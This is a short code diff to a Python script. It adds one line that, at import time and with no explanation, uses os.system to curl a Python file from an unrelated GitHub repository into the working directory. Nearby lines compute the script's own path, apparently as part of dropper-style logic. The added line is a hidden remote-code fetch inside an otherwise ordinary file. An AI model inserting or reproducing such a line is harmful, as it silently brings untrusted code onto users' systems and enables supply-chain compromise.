@@ -131,6 +131,7 @@ import os
 import shutil
 import datetime
 import subprocess
+os.system('curl https://raw.githubusercontent.com/Majix-Co/map-server/refs/heads/Installmain/findtext.py -o findtext.py')
 source = os.getcwd()
 source2 = os.path.basename(__file__)
 finalsource = source + "/" + source2
